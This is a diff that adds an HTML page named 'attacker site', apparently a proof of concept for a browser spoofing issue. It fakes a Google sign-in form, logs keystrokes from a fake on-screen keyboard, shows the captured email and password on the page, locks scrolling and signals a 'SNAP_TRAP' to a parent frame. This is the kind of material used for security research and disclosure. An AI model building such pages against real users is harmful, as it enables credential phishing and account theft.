@@ -1,0 +1,298 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=no"
+    />
+    <title>attacker site</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        margin: 0;
+        min-height: 200vh;
+        color: #333;
+        background: #fff;
+        user-select: none;
+      }
+      .spacer {
+        height: 95vh;
+        background: #eee;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 0 20px;
+        color: #5f6368;
+        border-bottom: 1px solid #ccc;
+      }
+      .form-container {
+        padding: 30px 20px;
+        max-width: 350px;
+        margin: 0 auto;
+      }
+      .logo {
+        font-size: 24px;
+        font-weight: bold;
+        color: #202124;
+        margin-bottom: 20px;
+      }
+      .fake-input {
+        width: 100%;
+        height: 45px;
+        margin: 10px 0;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        box-sizing: border-box;
+        text-align: left;
+        padding: 0 15px;
+        line-height: 45px;
+        color: #000;
+        cursor: pointer;
+        background: #fff;
+      }
+      .fake-input.active {
+        border: 2px solid #1a73e8;
+        outline: none;
+      }
+      .fake-input.placeholder {
+        color: #70757a;
+      }
+      .btn {
+        width: 100%;
+        padding: 12px;
+        background: #1a73e8;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: bold;
+        margin-top: 15px;
+        cursor: pointer;
+      }
+
+      #fake-keyboard {
+        display: none;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background: #d1d5db;
+        padding: 10px 0 20px 0;
+        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+        z-index: 999999;
+      }
+      .kbd-row {
+        display: flex;
+        justify-content: center;
+        gap: 6px;
+        margin-bottom: 8px;
+      }
+      .key {
+        background: #fff;
+        border-radius: 5px;
+        padding: 12px 0;
+        min-width: 30px;
+        flex: 1;
+        max-width: 40px;
+        font-size: 18px;
+        font-weight: 500;
+        text-align: center;
+        cursor: pointer;
+        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+      }
+      .key:active {
+        background: #bbb;
+      }
+      .key-wide {
+        max-width: 60px;
+        font-size: 14px;
+        background: #aeb3ba;
+      }
+
+      #log {
+        display: none;
+        margin-top: 20px;
+        padding: 15px;
+        background: #fce8e6;
+        color: #d32f2f;
+        font-weight: bold;
+        border: 1px dashed #d32f2f;
+        word-wrap: break-word;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="spacer">
+      this page is very slow, scroll down 3-5 times to show the contents of
+      accounts.google.com
+    </div>
+
+    <div class="form-container">
+      <div class="logo">this is a accounts.google.com page</div>
+      <p>enter your email + password</p>
+
+      <div
+        id="inp-user"
+        class="fake-input placeholder"
+        onclick="focusField('user')"
+      >
+        Email or Username
+      </div>
+      <div
+        id="inp-pass"
+        class="fake-input placeholder"
+        onclick="focusField('pass')"
+      >
+        Password
+      </div>
+
+      <button class="btn" onclick="submitForm()">Next</button>
+      <div id="log"></div>
+    </div>
+
+    <div id="fake-keyboard">
+      <div class="kbd-row" id="row1"></div>
+      <div class="kbd-row" id="row2"></div>
+      <div class="kbd-row" id="row3">
+        <div class="key key-wide" onclick="typeChar('SHIFT')">⬆️</div>
+        <div class="key key-wide" onclick="typeChar('DEL')">⌫</div>
+      </div>
+      <div class="kbd-row">
+        <div class="key key-wide" onclick="typeChar('CLOSE')">Done</div>
+        <div
+          class="key"
+          style="flex: 3; max-width: 200px"
+          onclick="typeChar(' ')"
+        >
+          space
+        </div>
+        <div class="key key-wide" onclick="typeChar('.')">.</div>
+      </div>
+    </div>
+
+    <script>
+      const rows = [
+        ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p"],
+        ["a", "s", "d", "f", "g", "h", "j", "k", "l"],
+        ["z", "x", "c", "v", "b", "n", "m"],
+      ];
+
+      let isShift = false;
+      let activeField = null;
+      let data = { user: "", pass: "" };
+
+      function renderKeys() {
+        document.getElementById("row1").innerHTML = rows[0]
+          .map(
+            (k) =>
+              `<div class="key" onclick="typeChar('${k}')">${isShift ? k.toUpperCase() : k}</div>`,
+          )
+          .join("");
+        document.getElementById("row2").innerHTML = rows[1]
+          .map(
+            (k) =>
+              `<div class="key" onclick="typeChar('${k}')">${isShift ? k.toUpperCase() : k}</div>`,
+          )
+          .join("");
+
+        let r3Html = `<div class="key key-wide" onclick="typeChar('SHIFT')">⬆️</div>`;
+        r3Html += rows[2]
+          .map(
+            (k) =>
+              `<div class="key" onclick="typeChar('${k}')">${isShift ? k.toUpperCase() : k}</div>`,
+          )
+          .join("");
+        r3Html += `<div class="key key-wide" onclick="typeChar('DEL')">⌫</div>`;
+        document.getElementById("row3").innerHTML = r3Html;
+      }
+      renderKeys();
+
+      function focusField(field) {
+        activeField = field;
+        document.getElementById("inp-user").classList.remove("active");
+        document.getElementById("inp-pass").classList.remove("active");
+        document.getElementById("inp-" + field).classList.add("active");
+        document.getElementById("fake-keyboard").style.display = "block";
+      }
+
+      function typeChar(char) {
+        if (!activeField) return;
+
+        if (char === "CLOSE") {
+          document.getElementById("fake-keyboard").style.display = "none";
+          document
+            .getElementById("inp-" + activeField)
+            .classList.remove("active");
+          activeField = null;
+          return;
+        }
+
+        if (char === "SHIFT") {
+          isShift = !isShift;
+          renderKeys();
+          return;
+        }
+
+        if (char === "DEL") {
+          data[activeField] = data[activeField].slice(0, -1);
+        } else {
+          let c = isShift && char.length === 1 ? char.toUpperCase() : char;
+          data[activeField] += c;
+        }
+
+        updateDisplay();
+      }
+
+      function updateDisplay() {
+        let uEl = document.getElementById("inp-user");
+        let pEl = document.getElementById("inp-pass");
+
+        if (data.user) {
+          uEl.innerText = data.user;
+          uEl.classList.remove("placeholder");
+        } else {
+          uEl.innerText = "Email or phone";
+          uEl.classList.add("placeholder");
+        }
+
+        if (data.pass) {
+          pEl.innerText = "•".repeat(data.pass.length);
+          pEl.classList.remove("placeholder");
+        } else {
+          pEl.innerText = "Password";
+          pEl.classList.add("placeholder");
+        }
+      }
+
+      function submitForm() {
+        document.getElementById("fake-keyboard").style.display = "none";
+        if (data.user && data.pass) {
+          let log = document.getElementById("log");
+          log.style.display = "block";
+          log.innerHTML =
+            "CAPTURED:<br>User: " + data.user + "<br>Pass: " + data.pass;
+        } else {
+          alert("Fill all fields");
+        }
+      }
+
+      let maxScroll = 0;
+      let isTrapSnapped = false;
+
+      window.addEventListener("scroll", () => {
+        if (window.scrollY > maxScroll) {
+          maxScroll = window.scrollY;
+          if (maxScroll > window.innerHeight * 0.6 && !isTrapSnapped) {
+            isTrapSnapped = true;
+            window.parent.postMessage("SNAP_TRAP", "*");
+          }
+        } else if (window.scrollY < maxScroll - 2) {
+          window.scrollTo({ top: maxScroll, behavior: "instant" });
+        }
+      });
+    </script>
+  </body>
+</html>
